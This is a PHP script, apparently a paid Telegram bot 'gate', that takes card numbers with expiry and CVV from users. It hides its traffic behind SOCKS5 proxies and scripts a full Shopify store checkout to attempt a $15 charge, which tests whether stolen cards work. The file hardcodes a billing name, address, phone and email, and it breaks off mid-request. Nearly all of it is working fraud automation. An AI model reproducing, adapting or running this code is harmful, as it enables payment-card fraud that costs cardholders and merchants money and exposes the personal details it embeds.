<?php
$start_time = microtime(true);

/*$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "GATE IS UNDER MAINTENANCE",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
*/
if ($text == '/sfb') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Shopify+Braintree (v3) 15$ Charge - /sfb \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$credits_file = file_get_contents('Tools/Credits.txt');
$credits_lines = explode("\n", $credits_file);
foreach ($credits_lines as $line) {
  if (strpos($line, $userId) === 0) {
    $user_credits = intval(substr($line, strlen($userId) + 1));
    break;
  }
}
if ($user_credits < 1) { $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'message_id' => $message_idd,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐘𝐨𝐮 𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐒𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝",
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}

include 'Tools/Regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
include 'Tools/Antispam.php';

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$i     = explode("|", $lista);
$cc    = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];

if (number_format($mon) < 10){$mon = str_replace("0", "", $mon);};

if(strlen($year) == 2){
($year = "20"."$year");
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
$max_retries = 3;
$retry_count = 0;
#01. Req
$ch = curl_init();
do {include 'Tools/Proxy.php';
curl_setopt($ch, CURLOPT_URL, 'https://www.mychoicesoftware.com/cart/22820646535:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
$curl1 = curl_exec($ch);
$redirect = curl_getinfo($ch)['redirect_url'];
$redirect2 = trim(strip_tags(getStr($redirect,'https://www.mychoicesoftware','?')));
$URL2 = trim(strip_tags(getStr($redirect,'https://www.mychoicesoftware/','?')));
$urll = "https://www.mychoicesoftware$redirect2";
curl_close($ch);
$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘼𝙙𝙙𝙞𝙣𝙜 𝙋𝙧𝙤𝙙𝙪𝙘𝙩 𝙏𝙤 𝘾𝙖𝙧𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
 if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
  
  
#02. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl2 = curl_exec($ch);
$autht1 = trim(strip_tags(getStr($curl2,'name="authenticity_token" value="','"')));
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙇𝙞𝙣𝙠 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 03 Req..
$ch = curl_init();
  do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.mychoicesoftware.com',
'referer: '.$urll.'?traffic_source=buy_now',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht1.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=abhays32109%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Battributes%5D%5BSales+Person%5D=&checkout%5Battributes%5D%5BPO+Number%5D=&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Jack&checkout%5Bbilling_address%5D%5Blast_name%5D=Coddrey&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=57677+Gardenia+Drive&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=Atwater&checkout%5Bbilling_address%5D%5Bprovince%5D=CA&checkout%5Bbilling_address%5D%5Bzip%5D=95301&checkout%5Bbilling_address%5D%5Bphone%5D=%28425%29+784-2433&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=375&checkout%5Bclient_details%5D%5Bbrowser_height%5D=553&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=32&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0');
$curl3 = curl_exec($ch);
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙄𝙣𝙨𝙚𝙧𝙩𝙞𝙣𝙜 𝘿𝙚𝙩𝙖𝙞𝙡𝙨 𝙖𝙣𝙙 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#Misslaneous. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.mychoicesoftware.com/wpm@0.0.290@9b91aff1w4418c6afpfb9312f0m353e3d83/sandbox/'.$URL2.'?previous_step=contact_information&step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$miss1 = curl_exec($ch);
curl_close($ch);

#04. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'?step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl4 = curl_exec($ch);
$autht2 = trim(strip_tags(getStr($curl4,'name="authenticity_token" value="','"')));
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙍𝙚𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙣𝙜 𝙏𝙤 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙋𝙖𝙜𝙚 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 05 Req..
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Host: deposit.us.shopifycs.com',
'Origin: https://checkout.shopifycs.com',
'Referer: https://checkout.shopifycs.com/',
'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"ajay singh","month":'.$mon.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.mychoicesoftware.com"}');
$curl5 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl5,'id":"','"')));
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 06 Req..
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht2.'&previous_step=payment_method&step=&s='.$pid.'&checkout%5Bpayment_gateway%5D=19162241&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=1500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=375&checkout%5Bclient_details%5D%5Bbrowser_height%5D=553&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=32&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0');
$curl6 = curl_exec($ch);
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙄𝙣𝙨𝙚𝙧𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#Misslaneous. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.mychoicesoftware.com/wpm@0.0.290@9b91aff1w4418c6afpfb9312f0m353e3d83/sandbox/'.$URL2.'/processing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$miss2 = curl_exec($ch);
curl_close($ch);

//NEW EXTRA REQUEST//

#New1. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$urll.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
